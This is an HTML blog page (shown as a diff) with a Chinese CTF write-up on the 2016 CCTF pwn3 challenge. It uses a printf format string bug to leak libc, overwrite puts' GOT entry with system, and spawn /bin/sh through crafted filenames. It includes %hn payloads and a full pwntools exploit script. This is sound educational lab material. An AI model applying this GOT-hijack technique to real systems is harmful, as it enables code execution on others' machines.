@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>格式化字符串之Hijack_Got利用 | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN,Linux," />
+  
+
+  <meta name="description" content="格式化字符串，fmtstr">
+<meta name="keywords" content="PWN,BIN,Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串之Hijack_Got利用">
+<meta property="og:url" content="http://yoursite.com/2018/05/17/格式化字符串Hijack_Got利用/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="格式化字符串，fmtstr">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/格式化字符串got/屏幕快照%202018-05-17%20下午9.14.54.png">
+<meta property="og:image" content="http://yoursite.com/格式化字符串got/屏幕快照%202018-05-17%20下午9.21.08.png">
+<meta property="og:image" content="http://yoursite.com/格式化字符串got/屏幕快照%202018-05-17%20下午9.26.22.png">
+<meta property="og:image" content="http://yoursite.com/格式化字符串got/屏幕快照%202018-05-17%20下午9.27.20.png">
+<meta property="og:image" content="http://yoursite.com/格式化字符串got/屏幕快照%202018-05-17%20下午9.29.51.png">
+<meta property="og:image" content="http://yoursite.com/Users/v1nke/格式化字符串got/屏幕快照%202018-05-17%20下午9.44.37.png">
+<meta property="og:image" content="http://yoursite.com/格式化字符串got/屏幕快照%202018-05-17%20下午9.59.13.png">
+<meta property="og:image" content="http://yoursite.com/格式化字符串got/屏幕快照%202018-05-17%20下午10.00.31.png">
+<meta property="og:updated_time" content="2018-05-17T14:06:47.156Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="格式化字符串之Hijack_Got利用">
+<meta name="twitter:description" content="格式化字符串，fmtstr">
+<meta name="twitter:image" content="http://yoursite.com/格式化字符串got/屏幕快照%202018-05-17%20下午9.14.54.png">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正题："><span class="toc-text">正题：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-如何执行system函数："><span class="toc-text">1.如何执行system函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0xa-利用pwntools中已经成型的函数fmtstr-payload"><span class="toc-text">0xa. 利用pwntools中已经成型的函数fmtstr-payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0xb-自己构造playload"><span class="toc-text">0xb. 自己构造playload</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-如何获取-bin-sh字符串？"><span class="toc-text">2. 如何获取/bin/sh字符串？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-格式化字符串Hijack_Got利用" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">格式化字符串之Hijack_Got利用</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.05.17</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>上了一天的课已经很疲惫了，想着今晚就把昨天所解的一道格式化字符串的漏洞给写一下，然后好好睡一觉接着上课，昨晚画工图画到怀疑人生，突然惊觉明天运动会放假，不用上课啦哈哈哈哈哈哈，开心～</p>
+<h2 id="正题："><a href="#正题：" class="headerlink" title="正题："></a>正题：</h2><p>一道泄漏libc来利用的格式化字符串题。</p>
+<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3" target="_blank" rel="noopener">题目</a></p>
+<p>直接上手反汇编：</p>
+<p><img src="/格式化字符串got/屏幕快照 2018-05-17 下午9.14.54.png" alt="屏幕快照 2018-05-17 下午9.14.54"></p>
+<p>加上运行过后整体了解到有一块检测登陆用户和三个模块函数，一个是编写文件’put’，一个是显示文件’dir’，还有一个是读取文件’get’。</p>
+<p>这里推荐一个比较好用的格式化漏洞查看的插件，叫lazyIDA，在GitHub上有开源项目。</p>
+<p>漏洞点出现在这里读取文件函数里面：</p>
+<p><img src="/格式化字符串got/屏幕快照 2018-05-17 下午9.21.08.png" alt="屏幕快照 2018-05-17 下午9.21.08"></p>
+<p>最后面的printf处。它的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0804889E                 call    _printf</span><br></pre></td></tr></table></figure>
+<p>用gdb在这里下断点后开始调试。前面验证用户名密码的步骤很容易就可以patch掉，密码是’rxraclhm’。暂停在断点处：</p>
+<p><img src="/格式化字符串got/屏幕快照 2018-05-17 下午9.26.22.png" alt="屏幕快照 2018-05-17 下午9.26.22"></p>
+<p>往下看堆栈中的数据：</p>
+<p><img src="/格式化字符串got/屏幕快照 2018-05-17 下午9.27.20.png" alt="屏幕快照 2018-05-17 下午9.27.20"></p>
+<p>可以看见我们的输入出现在距离格式化字符串的偏移量为7的位置。</p>
+<p>偏移地址找到了，接下来就是找需要泄漏的函数，我们这里用常规函数’__libc_start_main’来泄漏。但是好像在堆栈中没有找到这个函数？不一定，我们往下继续找：</p>
+<p><img src="/格式化字符串got/屏幕快照 2018-05-17 下午9.29.51.png" alt="屏幕快照 2018-05-17 下午9.29.51"></p>
+<p>终于在距离偏移91处找到了改函数+247后的地址，所以泄漏改地址之后再减去247后就是真正的’__libc_start_main’函数的地址。那么我们就在所’put’上去的文件内容中写上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%91$p</span><br></pre></td></tr></table></figure>
+<p>就可以得到该地址。</p>
+<p>得到system函数的地址之后接下来我们要做的是什么？</p>
+<ol>
+<li>如何执行system函数？</li>
+<li>/bin/sh字符串如何获取？</li>
+</ol>
+<h4 id="1-如何执行system函数："><a href="#1-如何执行system函数：" class="headerlink" title="1.如何执行system函数："></a>1.如何执行system函数：</h4><p>我们可以利用格式化字符串漏洞覆盖大数字的作用去修改got表的地址，这里我们想到的就是将puts函数的got表地址修改成system函数地址，所以当执行puts函数的时候其实执行的是system函数。接下来就是如何去修改的问题了。</p>
+<p>这里有两种方法：</p>
+<h5 id="0xa-利用pwntools中已经成型的函数fmtstr-payload"><a href="#0xa-利用pwntools中已经成型的函数fmtstr-payload" class="headerlink" title="0xa. 利用pwntools中已经成型的函数fmtstr-payload"></a>0xa. 利用pwntools中已经成型的函数fmtstr-payload</h5><p>该函数的利用方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(7, &#123;puts_got: system_addr&#125;)</span><br><span class="line">payload = fmtstr_payload(7, &#123;puts_got: system_addr&#125;)</span><br></pre></td></tr></table></figure>
+<p>意思就是，格式化字符串的偏移是7，我希望在puts_got地址处写入system_addr地址。默认情况下是按照字节来写的。</p>
+<p>puts_got的地址可以用ELF.got[‘puts’]来获取，system地址上面已经获取到了。</p>
+<h5 id="0xb-自己构造playload"><a href="#0xb-自己构造playload" class="headerlink" title="0xb. 自己构造playload"></a>0xb. 自己构造playload</h5><p>格式化字符串写一般分两次写入,每次写半个dword长度的内容,这样可以大大减少程序输出大量空格的时间。两个payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 = p32(puts_got) + &apos;%%%dc&apos; % ((system_addr &amp; 0xffff)-4) + &apos;%7$hn&apos;</span><br><span class="line">payload2 = p32(puts_got+2) + &apos;%%%dc&apos; % ((system_addr&gt;&gt;16 &amp; 0xffff)-4) + &apos;%7$hn&apos;</span><br></pre></td></tr></table></figure>
+<p>当前环境中，实际内容是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 = &quot;x28xa0x04x08%396c%7$hn&quot;</span><br><span class="line">payload2 = &quot;x2axa0x04x08%46942c%7$hn&quot;</span><br></pre></td></tr></table></figure>
+<p>其中p32(puts_got)将数字形式的0x0804a028转为可被读入内存的字符串形式”x28xa0x04x08”,%396c与%46942c代表输出396或46942个空格,system_addr &amp; 0xffff 取半个dword后还需减去4,是因为前面p32(puts_got)已经占了四个字节,这四个字节与后面的空格数相加的总字节数相加刚好为system_addr &amp; 0xffff,而该值将会写入当前printf的第7个不定参数中,而这第七个不定参数正好是puts_got与puts_got+2 ,以shellcode2的执行情况为例,请看下图:</p>
+<p><img src="/Users/v1nke/格式化字符串got/屏幕快照 2018-05-17 下午9.44.37.png" alt="屏幕快照 2018-05-17 下午9.44.37"></p>
+<p>prinf函数的参数从栈顶开始,栈顶指向我们所构造的format payload字符串的地址,然后往下分别是第一个不定参数,第二个不定参数……第七个不定参数即为我们所输入的格式化串中的前四个字节内容0x0804a02a。因而执行完该语句后,会向0x0804a02a写入两个字节内容:0xb762。</p>
+<p>payload1的执行过程同理,当执行完以上两条payload之后,我们便成功向地址0x0804a028中写入了四字节内容0xb7620190,即将plt表中puts的地址替换成了system函数的地址,所以当再次向系统发送dir指令,并执行puts函数时,实际执行的则是system函数。</p>
+<h4 id="2-如何获取-bin-sh字符串？"><a href="#2-如何获取-bin-sh字符串？" class="headerlink" title="2. 如何获取/bin/sh字符串？"></a>2. 如何获取/bin/sh字符串？</h4><p>这里就得看自己的眼尖不尖了，或者也可以说是自己想不想的到了，puts函数在dir函数中用到，因为puts出来的是文件名，所以当puts执行的是system函数时所用的参数就是文件名，所以我们可以把文件名写成/bin/sh来完成调用。</p>
+<p>因为整个exp中需要put两次文件，所以第一次put文件名可以用’/sh’，第二次在用’/bin’。或者是最后一次直接使用’/bin/sh;’文件名，用分号直接区分开来。我们可以用gdb来看看，在puts函数处下断点：</p>
+<p><img src="/格式化字符串got/屏幕快照 2018-05-17 下午9.59.13.png" alt="屏幕快照 2018-05-17 下午9.59.13"></p>
+<p>这是加分号的情况。</p>
+<p><img src="/格式化字符串got/屏幕快照 2018-05-17 下午10.00.31.png" alt="屏幕快照 2018-05-17 下午10.00.31"></p>
+<p>这是分两次输入/bin/sh的情况。以上两种都成功执行了system函数。</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./pwn3&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so&apos;)</span><br><span class="line">elf = ELF(&apos;pwn3&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Name (ftp.hacker.server:Rainism):&apos;)</span><br><span class="line">p.sendline(&apos;rxraclhm&apos;)</span><br><span class="line">p.recvuntil(&apos;ftp&gt;&apos;)</span><br><span class="line">p.sendline(&apos;put&apos;)</span><br><span class="line">p.recvuntil(&apos;please enter the name of the file you want to upload:&apos;)</span><br><span class="line">p.sendline(&apos;/sh&apos;)</span><br><span class="line">p.recvuntil(&apos;then, enter the content:&apos;)</span><br><span class="line">p.sendline(&apos;%91$p&apos;)</span><br><span class="line">p.recvuntil(&apos;ftp&gt;&apos;)</span><br><span class="line">p.sendline(&apos;get&apos;)</span><br><span class="line">p.recvuntil(&apos;enter the file name you want to get:&apos;)</span><br><span class="line">p.sendline(&apos;/sh&apos;)</span><br><span class="line"></span><br><span class="line">libc_addr = int(p.recv(10),16)</span><br><span class="line">print libc_addr</span><br><span class="line">libc_real = libc_addr - 247</span><br><span class="line">libc_base = libc_real - libc.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">sys_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">print hex(sys_addr)</span><br><span class="line"></span><br><span class="line">put_got = elf.got[&apos;puts&apos;]</span><br><span class="line">playload = fmtstr_payload(7, &#123;put_got: sys_addr&#125;)</span><br><span class="line">p.recvuntil(&apos;ftp&gt;&apos;)</span><br><span class="line">p.sendline(&apos;put&apos;)</span><br><span class="line">p.recvuntil(&apos;please enter the name of the file you want to upload:&apos;)</span><br><span class="line">p.sendline(&apos;/bin&apos;)</span><br><span class="line">p.recvuntil(&apos;then, enter the content:&apos;)</span><br><span class="line">p.sendline(playload)</span><br><span class="line">p.recvuntil(&apos;ftp&gt;&apos;)</span><br><span class="line">p.sendline(&apos;get&apos;)</span><br><span class="line">p.recvuntil(&apos;enter the file name you want to get:&apos;)</span><br><span class="line">p.sendline(&apos;/bin&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&apos;ftp&gt;&apos;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(&apos;dir&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>学习愉快~</p>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/05/16/吉林省网络安全初赛ELF逆向解析/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
